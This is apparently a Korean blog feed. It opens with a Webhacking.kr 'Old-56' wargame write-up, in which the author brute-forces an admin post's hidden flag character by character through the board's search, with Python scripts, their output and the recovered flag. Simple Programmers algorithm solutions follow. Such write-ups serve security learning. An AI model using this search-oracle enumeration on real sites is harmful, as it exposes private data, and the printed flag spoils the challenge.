      <content:encoded><![CDATA[<h1 id="Webhacking-kr-Write-Up"><a href="#Webhacking-kr-Write-Up" class="headerlink" title="Webhacking.kr Write Up"></a>Webhacking.kr Write Up</h1><h2 id="Old-56"><a href="#Old-56" class="headerlink" title="Old - 56"></a>Old - 56</h2><p><img src="/images/pasted-434.png"><br>게시판 페이지가 나왔다. 기능을 보기 위해 게시판 글과 검색 기능을 사용해봤다.</p><p><img src="/images/pasted-435.png"><br>Admin의 readme 글은 access denied로 볼 수 없다.</p><p><img src="/images/pasted-436.png"><br>Guest의 hi~ 글은 권한이 모든 사람이 접근할 수 있는 권한인 듯하다.</p><p>해당 글들의 URL을 살펴보니, <code>read=admin</code>, <code>read=quest</code>로 되어 있었다.<br><br>때문에 Injection으로 문제 접근이 불가능해보였다.</p><p><img src="/images/pasted-437.png"><br>검색 기능을 보기위해 <code>admin, guest, hi~, readme</code>를 입력해봤지만, 모두 위와 같이 결과가 출력되었다.</p><p><img src="/images/pasted-438.png"><br>그래서 “게시판 글 안에 있는 Text를 검색하는건가?”라는 생각에 <code>hello~</code>를 검색하니, 글이 출력이 되었다.</p><p>이를 이용하여 나는 admin의 readme를 추측하기로 하였다.<br><br>readme 안에 있는 글은 flag가 있을 것이라 추측이 된다.</p><p><img src="/images/pasted-439.png"><br>그래서 <code>flag</code>를 검색하니, readme가 출력이 되었다.</p><p>이제 파이썬으로 <code>flag&#123;</code>을 시작으로 특수 문자, 알파벳, 숫자를 이용하여 무차별 공격을 시도하였다.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, string</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup <span class="keyword">as</span> bs</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flagParser</span>(<span class="params">url:<span class="built_in">str</span></span>):</span></span><br><span class="line">    flag = <span class="string">&#x27;flag&#123;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> flag[<span class="number">-1</span>] == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> string.ascii_lowercase + string.digits + string.punctuation:</span><br><span class="line">            data = &#123;<span class="string">&#x27;search&#x27;</span>: flag+i&#125;</span><br><span class="line">            </span><br><span class="line">            res = requests.post(url, data=data)</span><br><span class="line">            soup = bs(res.text, <span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line">            result = soup.select(<span class="string">&#x27;table tr td a&#x27;</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> result:</span><br><span class="line">                flag += i</span><br><span class="line">                print(flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    url = <span class="string">&#x27;https://webhacking.kr/challenge/web-33/index.php&#x27;</span></span><br><span class="line"></span><br><span class="line">    print(flagParser(url))</span><br></pre></td></tr></table></figure><figure class="highlight zsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">lag&#123;himiko%a%cute%dont%hink%o%%%</span><br><span class="line">flag&#123;himiko%a%cute%dont%hink%o%%%%</span><br><span class="line">flag&#123;himiko%a%cute%dont%hink%o%%%%%</span><br><span class="line">flag&#123;himiko%a%cute%dont%hink%o%%%%%%</span><br><span class="line">flag&#123;himiko%a%cute%dont%hink%o%%%%%%%</span><br><span class="line">flag&#123;himiko%a%cute%dont%hink%o%%%%%%%%</span><br><span class="line">flag&#123;himiko%a%cute%dont%hink%o%%%%%%%%%</span><br><span class="line">flag&#123;himiko%a%cute%dont%hink%o%%%%%%%%%%</span><br></pre></td></tr></table></figure><p>되긴 되는데 뭔가 이상하게 나온다.<br><br>지금까지 flag 값에 띄어쓰기 대신 들어가는 특수문자 _이 안나오고, %이 나오는 것이다.<br><br>그리고 끝도 모르는 %이 계속 뒤에 출력이 되었다.</p><p>그래서 직접 값을 보내봐서 확인을 해봤다.<br><br>확인을 해보니, <code>flag&#123;himiko_</code>는 readme가 출력이 되었고, <code>flag&#123;himiko_a</code>는 출력이 안되었다.</p><p>나는 이것을 보고 readme 안에 <code>flag&#123;himiko%a~~~~</code>와 <code>flag&#123;himiko_~~~~&#125;</code>이 있다는 것을 알 수 있었다.<br><br>그래서 코드를 수정하였다.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, string</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup <span class="keyword">as</span> bs</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flagParser</span>(<span class="params">url:<span class="built_in">str</span></span>):</span></span><br><span class="line">    flag = <span class="string">&#x27;flag&#123;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> flag[<span class="number">-1</span>] == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> string.ascii_lowercase + string.digits + <span class="string">&#x27;_&#125;&#x27;</span> + string.punctuation:</span><br><span class="line">            data = &#123;<span class="string">&#x27;search&#x27;</span>: flag+i&#125;</span><br><span class="line">            </span><br><span class="line">            res = requests.post(url, data=data)</span><br><span class="line">            soup = bs(res.text, <span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line">            result = soup.select(<span class="string">&#x27;table tr td a&#x27;</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> result:</span><br><span class="line">                flag += i</span><br><span class="line">                print(flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    url = <span class="string">&#x27;https://webhacking.kr/challenge/web-33/index.php&#x27;</span></span><br><span class="line"></span><br><span class="line">    print(flagParser(url))</span><br></pre></td></tr></table></figure><figure class="highlight zsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;himiko_toga_is_cute_dont_you_think_so_</span><br><span class="line">flag&#123;himiko_toga_is_cute_dont_you_think_so__</span><br><span class="line">flag&#123;himiko_toga_is_cute_dont_you_think_so__%</span><br><span class="line">flag&#123;himiko_toga_is_cute_dont_you_think_so__%%</span><br><span class="line">flag&#123;himiko_toga_is_cute_dont_you_think_so__%%%</span><br><span class="line">flag&#123;himiko_toga_is_cute_dont_you_think_so__%%%%</span><br></pre></td></tr></table></figure><p>잘 출력이 되다가 또 분기점을 만나서 %이 출력이 된다.</p><p>그래서 특수문자를 필요없는 줄여보기로 하였다.<br><br>flag에 들어가는 특수문자는 <code>&#123;, &#125;, _, ?, !, @, $, ^, &amp;, *</code>으로 추려졌다. <br><br>왜냐하면 <code>&lt;, &gt;, (, )</code>은 <code>&#123;, &#125;</code> 때문에 사용을 안할 것으로 판단됐다.</p><p>여기서 특수문자가 나오는 순서에 따라 다른 값으로 빠지기 때문에 나는 순서를 수정하였다.<br><br><code>&#125;, ?, !, @, #, $, ^, &amp;, *, _</code>으로 수정하였다.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, string</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup <span class="keyword">as</span> bs</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flagParser</span>(<span class="params">url:<span class="built_in">str</span></span>):</span></span><br><span class="line">    flag = <span class="string">&#x27;flag&#123;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> flag[<span class="number">-1</span>] == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> string.ascii_lowercase + string.digits + <span class="string">&#x27;&#125;?!@#$^&amp;*_&#x27;</span>:</span><br><span class="line">            data = &#123;<span class="string">&#x27;search&#x27;</span>: flag+i&#125;</span><br><span class="line">            </span><br><span class="line">            res = requests.post(url, data=data)</span><br><span class="line">            soup = bs(res.text, <span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line">            result = soup.select(<span class="string">&#x27;table tr td a&#x27;</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> result:</span><br><span class="line">                flag += i</span><br><span class="line">                print(flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    url = <span class="string">&#x27;https://webhacking.kr/challenge/web-33/index.php&#x27;</span></span><br><span class="line"></span><br><span class="line">    print(flagParser(url))</span><br></pre></td></tr></table></figure><figure class="highlight zsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;himiko_toga_is_cute_dont_you_think_s</span><br><span class="line">flag&#123;himiko_toga_is_cute_dont_you_think_so</span><br><span class="line">flag&#123;himiko_toga_is_cute_dont_you_think_so?</span><br><span class="line">flag&#123;himiko_toga_is_cute_dont_you_think_so?&#125;</span><br><span class="line">flag&#123;himiko_toga_is_cute_dont_you_think_so?&#125;</span><br></pre></td></tr></table></figure><p>부족한 실력 때문에 시간을 많이 소모하였지만, Flag를 획득할 수 있었다.</p>]]></content:encoded>
      
      
      <category domain="https://lrtk-coder.github.io/categories/Security/">Security</category>
      
      <category domain="https://lrtk-coder.github.io/categories/Security/Web/">Web</category>
      
      <category domain="https://lrtk-coder.github.io/categories/Security/Web/Webhacking-kr/">Webhacking.kr</category>
      
      
      <category domain="https://lrtk-coder.github.io/tags/Webhacking-kr/">Webhacking.kr</category>
      
      
      <comments>https://lrtk-coder.github.io/2021/05/22/Webhacking-kr-Old-56-Write-Up/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Programmers Level 1 - 나누어 떨어지는 숫자 배열</title>
      <link>https://lrtk-coder.github.io/2021/05/22/Programmers-Level-1-%EB%82%98%EB%88%84%EC%96%B4-%EB%96%A8%EC%96%B4%EC%A7%80%EB%8A%94-%EC%88%AB%EC%9E%90/</link>
      <guid>https://lrtk-coder.github.io/2021/05/22/Programmers-Level-1-%EB%82%98%EB%88%84%EC%96%B4-%EB%96%A8%EC%96%B4%EC%A7%80%EB%8A%94-%EC%88%AB%EC%9E%90/</guid>
      <pubDate>Sat, 22 May 2021 14:15:01 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;나누어-떨어지는-숫자-배열&quot;&gt;&lt;a href=&quot;#나누어-떨어지는-숫자-배열&quot; class=&quot;headerlink&quot; title=&quot;나누어 떨어지는 숫자 배열&quot;&gt;&lt;/a&gt;&lt;a href=&quot;https://programmers.co.kr/learn/cou</description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="나누어-떨어지는-숫자-배열"><a href="#나누어-떨어지는-숫자-배열" class="headerlink" title="나누어 떨어지는 숫자 배열"></a><a href="https://programmers.co.kr/learn/courses/30/lessons/12910">나누어 떨어지는 숫자 배열</a></h1><h2 id="문제-설명"><a href="#문제-설명" class="headerlink" title="문제 설명"></a>문제 설명</h2><p>array의 각 element 중 divisor로 나누어 떨어지는 값을 오름차순으로 정렬한 배열을 반환하는 함수, solution을 작성해주세요.<br><br>divisor로 나누어 떨어지는 element가 하나도 없다면 배열에 -1을 담아 반환하세요.</p><h2 id="제한사항"><a href="#제한사항" class="headerlink" title="제한사항"></a>제한사항</h2><ul><li>arr은 자연수를 담은 배열입니다.</li><li>정수 i, j에 대해 i ≠ j 이면 arr[i] ≠ arr[j] 입니다.</li><li>divisor는 자연수입니다.</li><li>array는 길이 1 이상인 배열입니다.</li></ul><h3 id="문제-풀이"><a href="#문제-풀이" class="headerlink" title="문제 풀이"></a>문제 풀이</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solution</span>(<span class="params">arr:<span class="built_in">list</span>, divisor:<span class="built_in">int</span></span>):</span></span><br><span class="line">    result = [i <span class="keyword">for</span> i <span class="keyword">in</span> arr <span class="keyword">if</span> i%divisor == <span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sorted</span>(result) <span class="keyword">if</span> <span class="built_in">len</span>(result) <span class="keyword">else</span> [<span class="number">-1</span>]</span><br></pre></td></tr></table></figure><p>arr를 하나씩 꺼내서 divisor과 나누어 나머지가 0인 값들만 리스트에 넣었다.<br><br>그 후, 정렬 함수인 Sorted 함수를 이용하여 정렬하였고, 만약 리스트의 길이가 0이면 [-1]를 출력하였다.</p>]]></content:encoded>
      
      
      
      
      <comments>https://lrtk-coder.github.io/2021/05/22/Programmers-Level-1-%EB%82%98%EB%88%84%EC%96%B4-%EB%96%A8%EC%96%B4%EC%A7%80%EB%8A%94-%EC%88%AB%EC%9E%90/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Programmers Level 1 - 자릿수 더하기</title>
      <link>https://lrtk-coder.github.io/2021/05/22/Programmers-Level-1-%EC%9E%90%EB%A6%BF%EC%88%98-%EB%8D%94%ED%95%98%EA%B8%B0/</link>
      <guid>https://lrtk-coder.github.io/2021/05/22/Programmers-Level-1-%EC%9E%90%EB%A6%BF%EC%88%98-%EB%8D%94%ED%95%98%EA%B8%B0/</guid>
      <pubDate>Sat, 22 May 2021 14:02:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;자릿수-더하기&quot;&gt;&lt;a href=&quot;#자릿수-더하기&quot; class=&quot;headerlink&quot; title=&quot;자릿수 더하기&quot;&gt;&lt;/a&gt;&lt;a href=&quot;https://programmers.co.kr/learn/courses/30/lessons/12931</description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="자릿수-더하기"><a href="#자릿수-더하기" class="headerlink" title="자릿수 더하기"></a><a href="https://programmers.co.kr/learn/courses/30/lessons/12931">자릿수 더하기</a></h1><h2 id="문제-설명"><a href="#문제-설명" class="headerlink" title="문제 설명"></a>문제 설명</h2><p>자연수 N이 주어지면, N의 각 자릿수의 합을 구해서 return 하는 solution 함수를 만들어 주세요.<br>예를들어 N = 123이면 1 + 2 + 3 = 6을 return 하면 됩니다.</p><h2 id="제한사항"><a href="#제한사항" class="headerlink" title="제한사항"></a>제한사항</h2><p>N의 범위 : 100,000,000 이하의 자연수</p><h3 id="문제-풀이"><a href="#문제-풀이" class="headerlink" title="문제 풀이"></a>문제 풀이</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solution</span>(<span class="params">n:<span class="built_in">int</span></span>):</span></span><br><span class="line">    result = <span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">list</span>(<span class="built_in">str</span>(n)))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sum</span>(result)</span><br></pre></td></tr></table></figure><p>입력값을 문자열로 변환 후 List로 변경하면, 문자 하나하나가 List의 item이 된다.<br><br>E.g.)’123’ -&gt; [‘1’, ‘2’, ‘3’]</p><p>그 후 나는 Map 함수를 이용하여, List의 Item을 Int형으로 변경하여, Sum 함수로 총 합을 구하였다.</p><p>하지만 생각해보니, 굳이 List를 사용 안해도 Map 함수 안에서 for문으로 문자 하나씩 꺼내지니 리스트는 삭제하였다.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solution</span>(<span class="params">n:<span class="built_in">int</span></span>):</span></span><br><span class="line">    result = <span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">str</span>(n))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sum</span>(result)</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/">알고리즘</category>
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%ED%94%84%EB%A1%9C%EA%B7%B8%EB%9E%98%EB%A8%B8%EC%8A%A4/">프로그래머스</category>
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%ED%94%84%EB%A1%9C%EA%B7%B8%EB%9E%98%EB%A8%B8%EC%8A%A4/Level-1/">Level 1</category>
      
      
      <category domain="https://lrtk-coder.github.io/tags/Programmers/">Programmers</category>
      
      <category domain="https://lrtk-coder.github.io/tags/Programmers-Level-1/">Programmers Level 1</category>
      
      <category domain="https://lrtk-coder.github.io/tags/%EA%B5%AC%ED%98%84/">구현</category>
      
      
      <comments>https://lrtk-coder.github.io/2021/05/22/Programmers-Level-1-%EC%9E%90%EB%A6%BF%EC%88%98-%EB%8D%94%ED%95%98%EA%B8%B0/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Programmers Level 1 - 약수의 합</title>
      <link>https://lrtk-coder.github.io/2021/05/22/Programmers-Level-1-%EC%95%BD%EC%88%98%EC%9D%98-%ED%95%A9/</link>
      <guid>https://lrtk-coder.github.io/2021/05/22/Programmers-Level-1-%EC%95%BD%EC%88%98%EC%9D%98-%ED%95%A9/</guid>
      <pubDate>Sat, 22 May 2021 13:41:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;약수의-합&quot;&gt;&lt;a href=&quot;#약수의-합&quot; class=&quot;headerlink&quot; title=&quot;약수의 합&quot;&gt;&lt;/a&gt;&lt;a href=&quot;https://programmers.co.kr/learn/courses/30/lessons/12928&quot;&gt;약수의 </description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="약수의-합"><a href="#약수의-합" class="headerlink" title="약수의 합"></a><a href="https://programmers.co.kr/learn/courses/30/lessons/12928">약수의 합</a></h1><h2 id="문제-설명"><a href="#문제-설명" class="headerlink" title="문제 설명"></a>문제 설명</h2><p>정수 n을 입력받아 n의 약수를 모두 더한 값을 리턴하는 함수, solution을 완성해주세요.</p><h2 id="제한-사항"><a href="#제한-사항" class="headerlink" title="제한 사항"></a>제한 사항</h2><ul><li>n은 0 이상 3000이하인 정수입니다.</li></ul><h3 id="문제-풀이"><a href="#문제-풀이" class="headerlink" title="문제 풀이"></a>문제 풀이</h3><h4 id="방법1"><a href="#방법1" class="headerlink" title="방법1"></a>방법1</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solution</span>(<span class="params">n:<span class="built_in">int</span></span>):</span>    </span><br><span class="line">    result = [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, n+<span class="number">1</span>) <span class="keyword">if</span> n%i == <span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sum</span>(result)</span><br></pre></td></tr></table></figure><p>1부터 N까지 반복하면서, N과 나눠서 나머지가 0이 나온 값만 리스트에 넣었다.<br><br>그 후 Sum 함수를 이용하여 총 합을 반환하였다.</p><h4 id="방법2"><a href="#방법2" class="headerlink" title="방법2"></a>방법2</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solution</span>(<span class="params">n:<span class="built_in">int</span></span>):</span></span><br><span class="line">    half = n//<span class="number">2</span></span><br><span class="line">    result = [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, half+<span class="number">1</span>) <span class="keyword">if</span> n%i == <span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> n + <span class="built_in">sum</span>(result)</span><br></pre></td></tr></table></figure><p>방법1보다 효율적인 코드이다.<br><br>n을 제외한 약수를 보면, n/2 밑으로 형성되어 있기 때문에 굳이 반복을 1부터 N까지 돌릴 필요가 없다.</p><h4 id="방법3"><a href="#방법3" class="headerlink" title="방법3"></a>방법3</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solution</span>(<span class="params">n:<span class="built_in">int</span></span>):</span></span><br><span class="line">    sqrt = <span class="built_in">int</span>(n**<span class="number">0.5</span>)</span><br><span class="line">    result = [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, sqrt+<span class="number">1</span>) <span class="keyword">if</span> n%i == <span class="number">0</span>]</span><br><span class="line">    result.extend([n//i <span class="keyword">for</span> i <span class="keyword">in</span> result])</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sum</span>(<span class="built_in">set</span>(result))</span><br></pre></td></tr></table></figure><p>방법2보다 효율적인 코드이다.<br><br>1 ~ n/2까지 반복할 필요 없이 1 ~ 루트n까지만 반복하면 된다. 이러면 값이 커질 수록 시간 절약이 된다.</p>]]></content:encoded>
      
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/">알고리즘</category>
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%ED%94%84%EB%A1%9C%EA%B7%B8%EB%9E%98%EB%A8%B8%EC%8A%A4/">프로그래머스</category>
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%ED%94%84%EB%A1%9C%EA%B7%B8%EB%9E%98%EB%A8%B8%EC%8A%A4/Level-1/">Level 1</category>
      
      
      <category domain="https://lrtk-coder.github.io/tags/Programmers/">Programmers</category>
      
      <category domain="https://lrtk-coder.github.io/tags/Programmers-Level-1/">Programmers Level 1</category>
      
      <category domain="https://lrtk-coder.github.io/tags/%EA%B5%AC%ED%98%84/">구현</category>
      
      
      <comments>https://lrtk-coder.github.io/2021/05/22/Programmers-Level-1-%EC%95%BD%EC%88%98%EC%9D%98-%ED%95%A9/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Programmers Level 1 - 정수 제곱근 판별</title>
      <link>https://lrtk-coder.github.io/2021/05/22/Programmers-Level-1-%EC%A0%95%EC%88%98-%EC%A0%9C%EA%B3%B1%EA%B7%BC-%ED%8C%90%EB%B3%84/</link>
      <guid>https://lrtk-coder.github.io/2021/05/22/Programmers-Level-1-%EC%A0%95%EC%88%98-%EC%A0%9C%EA%B3%B1%EA%B7%BC-%ED%8C%90%EB%B3%84/</guid>
      <pubDate>Sat, 22 May 2021 13:30:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;정수-제곱근-판&quot;&gt;&lt;a href=&quot;#정수-제곱근-판&quot; class=&quot;headerlink&quot; title=&quot;정수 제곱근 판&quot;&gt;&lt;/a&gt;&lt;a href=&quot;https://programmers.co.kr/learn/courses/30/lessons/12</description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="정수-제곱근-판"><a href="#정수-제곱근-판" class="headerlink" title="정수 제곱근 판"></a><a href="https://programmers.co.kr/learn/courses/30/lessons/12934">정수 제곱근 판</a></h1><h2 id="문제-설명"><a href="#문제-설명" class="headerlink" title="문제 설명"></a>문제 설명</h2><p>임의의 양의 정수 n에 대해, n이 어떤 양의 정수 x의 제곱인지 아닌지 판단하려 합니다.<br><br>n이 양의 정수 x의 제곱이라면 x+1의 제곱을 리턴하고, n이 양의 정수 x의 제곱이 아니라면 -1을 리턴하는 함수를 완성하세요.</p><h2 id="제한-사항"><a href="#제한-사항" class="headerlink" title="제한 사항"></a>제한 사항</h2><ul><li>n은 1이상, 50000000000000 이하인 양의 정수입니다.</li></ul><h3 id="문제-풀이"><a href="#문제-풀이" class="headerlink" title="문제 풀이"></a>문제 풀이</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solution</span>(<span class="params">n:<span class="built_in">int</span></span>):</span></span><br><span class="line">    sqrt = n**<span class="number">0.5</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> sqrt == <span class="built_in">int</span>(sqrt):</span><br><span class="line">        <span class="keyword">return</span> (sqrt+<span class="number">1</span>)**<span class="number">2</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span></span><br></pre></td></tr></table></figure><p>루트를 씌이면, x를 구할 수 있다.<br><br>하지만, x의 제곱이 아닌 값은 소수점으로 값이 나오기 때문에 이를 구별해야한다.</p><p>이 풀이에선 float 타입을 int 타입으로 변환시키면, 소수점 밑으로는 버리는 점을 이용하였다.<br><br>E.g) 11.0 -&gt; 11 둘다 같은 값, 1.222 -&gt; 1 같은 값이 아님.</p>]]></content:encoded>
      
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/">알고리즘</category>
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%ED%94%84%EB%A1%9C%EA%B7%B8%EB%9E%98%EB%A8%B8%EC%8A%A4/">프로그래머스</category>
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%ED%94%84%EB%A1%9C%EA%B7%B8%EB%9E%98%EB%A8%B8%EC%8A%A4/Level-1/">Level 1</category>
      
      
      <category domain="https://lrtk-coder.github.io/tags/Programmers/">Programmers</category>
      
      <category domain="https://lrtk-coder.github.io/tags/Programmers-Level-1/">Programmers Level 1</category>
      
      <category domain="https://lrtk-coder.github.io/tags/%EA%B5%AC%ED%98%84/">구현</category>
      
      
      <comments>https://lrtk-coder.github.io/2021/05/22/Programmers-Level-1-%EC%A0%95%EC%88%98-%EC%A0%9C%EA%B3%B1%EA%B7%BC-%ED%8C%90%EB%B3%84/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Programmers Level 1 - 같은 숫자는 싫어</title>
      <link>https://lrtk-coder.github.io/2021/05/22/Programmers-Level-1-%EA%B0%99%EC%9D%80-%EC%88%AB%EC%9E%90%EB%8A%94-%EC%8B%AB%EC%96%B4/</link>
      <guid>https://lrtk-coder.github.io/2021/05/22/Programmers-Level-1-%EA%B0%99%EC%9D%80-%EC%88%AB%EC%9E%90%EB%8A%94-%EC%8B%AB%EC%96%B4/</guid>
